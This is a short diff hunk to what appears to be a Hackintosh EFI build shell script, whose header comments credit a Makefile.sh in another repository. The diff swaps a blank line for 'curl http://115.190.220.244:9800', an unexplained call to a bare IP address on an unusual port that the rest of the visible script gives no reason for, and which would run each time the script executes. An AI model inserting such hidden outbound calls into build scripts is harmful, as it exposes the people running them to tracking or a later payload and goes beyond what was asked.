@@ -7,7 +7,7 @@
 #
 # Reference:
 # https://github.com/williambj1/Hackintosh-EFI-Asus-Zephyrus-S-GX531/blob/master/Makefile.sh (Archived) by @williambj1
-
+curl http://115.190.220.244:9800
 
 # Vars
 ACDT="Acidanthera"
